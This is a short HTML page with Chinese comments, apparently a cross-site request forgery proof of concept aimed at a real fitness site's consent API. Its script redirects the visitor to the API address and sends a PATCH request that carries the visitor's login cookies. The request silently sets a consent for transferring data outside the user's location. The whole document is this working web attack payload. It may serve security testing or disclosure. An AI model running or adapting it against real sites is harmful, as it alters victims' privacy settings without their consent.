<!DOCTYPE html>
<html>
<body>
<script>
// 目标API地址
const apiUrl = 'https://www.myfitnesspal.com/api/idm/user-with-consents';

// 1. GET请求：通过window.location.href实现强制页面跳转（核心修改，满足跳转要求）
window.location.href = apiUrl; // 直接跳转至GET接口，浏览器地址栏会变为目标API地址

// 2. 固定domainUserId为1234567890，发起PATCH请求（跳转后执行）
const domainUserId = "1234567890";
if (domainUserId) {
  const xhrPatch = new XMLHttpRequest();
  xhrPatch.open('PATCH', apiUrl, true);
  xhrPatch.withCredentials = true; // 携带登录态Cookie
  xhrPatch.setRequestHeader('Content-Type', 'application/json'); // 必加，解析JSON请求体
  const requestBody = {
    "account_links": [
      {
        "domain":"MFP",
        "domainUserId": domainUserId, // 使用固定值1234567890
        "consent_matrix_version":"nc.20250403.01",
        "consents":{"transfer_outside_location":true},
        "ad_consents_last_seen":"2026-01-23T11:23:23.942Z"
      }
    ]
  };
  xhrPatch.send(JSON.stringify(requestBody));
}
</script>
</body>
</html>
